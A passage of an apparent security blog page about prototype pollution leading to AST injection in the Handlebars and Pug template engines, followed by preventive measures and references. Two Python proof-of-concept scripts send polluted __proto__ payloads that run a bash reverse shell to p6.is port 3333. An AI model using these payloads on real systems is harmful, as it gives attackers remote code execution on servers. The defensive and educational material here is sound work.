<span class="n">TARGET_URL</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://10.10.10.10:9090</span><span class="sh">'</span>

<span class="c1"># make pollution
</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">TARGET_URL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/vulnerable</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">__proto__.type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Program</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__proto__.body</span><span class="sh">"</span><span class="p">:</span> <span class="p">[{</span>
        <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">MustacheStatement</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">path</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">params</span><span class="sh">"</span><span class="p">:</span> <span class="p">[{</span>
            <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">NumberLiteral</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">value</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">process.mainModule.require(</span><span class="sh">'</span><span class="s">child_process</span><span class="sh">'</span><span class="s">).execSync(`bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1</span><span class="sh">'</span><span class="s">`)</span><span class="sh">"</span>
        <span class="p">}],</span>
        <span class="sh">"</span><span class="s">loc</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
            <span class="sh">"</span><span class="s">start</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">end</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span>
        <span class="p">}</span>
    <span class="p">}]</span>
<span class="p">})</span>

<span class="c1"># execute
</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">TARGET_URL</span><span class="p">)</span>
</code></pre></div></div> <h4 id="pug-vulnerability">Pug Vulnerability</h4> <p>Pug, another template engine, faces a similar risk of prototype pollution. Detailed information is available in the discussion on <a href="https://blog.p6.is/AST-Injection/#Pug">AST Injection in Pug</a>.</p> <p>Example of prototype pollution in Pug:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

<span class="n">TARGET_URL</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://10.10.10.10:9090</span><span class="sh">'</span>

<span class="c1"># make pollution
</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">TARGET_URL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/vulnerable</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">__proto__.block</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Text</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">line</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">process.mainModule.require(</span><span class="sh">'</span><span class="s">child_process</span><span class="sh">'</span><span class="s">).execSync(`bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1</span><span class="sh">'</span><span class="s">`)</span><span class="sh">"</span>
    <span class="p">}</span>
<span class="p">})</span>

<span class="c1"># execute
</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">TARGET_URL</span><span class="p">)</span>
</code></pre></div></div> <h3 id="preventive-measures">Preventive Measures</h3> <p>To reduce the risk of prototype pollution, the strategies listed below can be employed:</p> <ol> <li><strong>Object Immutability</strong>: The <code class="language-plaintext highlighter-rouge">Object.prototype</code> can be made immutable by applying <code class="language-plaintext highlighter-rouge">Object.freeze</code>.</li> <li><strong>Input Validation</strong>: JSON inputs should be rigorously validated against the application’s schema.</li> <li><strong>Safe Merge Functions</strong>: The unsafe use of recursive merge functions should be avoided.</li> <li><strong>Prototype-less Objects</strong>: Objects without prototype properties can be created using <code class="language-plaintext highlighter-rouge">Object.create(null)</code>.</li> <li><strong>Use of Map</strong>: Instead of <code class="language-plaintext highlighter-rouge">Object</code>, <code class="language-plaintext highlighter-rouge">Map</code> should be used for storing key-value pairs.</li> <li><strong>Library Updates</strong>: Security patches can be incorporated by regularly updating libraries.</li> <li><strong>Linter and Static Analysis Tools</strong>: Use tools like ESLint with appropriate plugins to detect and prevent prototype pollution vulnerabilities.</li> <li><strong>Code Reviews</strong>: Implement thorough code reviews to identify and remediate potential risks related to prototype pollution.</li> <li><strong>Security Training</strong>: Educate developers about the risks of prototype pollution and best practices for writing secure code.</li> <li><strong>Using Libraries with Caution</strong>: Be cautious while using third-party libraries. Assess their security posture and review their code, especially those manipulating objects.</li> <li><strong>Runtime Protection</strong>: Employ runtime protection mechanisms such as using security-focused npm packages which can detect and prevent prototype pollution attacks.</li> </ol> <h2 id="references">References</h2> <ul> <li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li> <li><a href="https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l">https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l</a></li> <li><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7</a></li> <li><a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li> </ul> </article> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>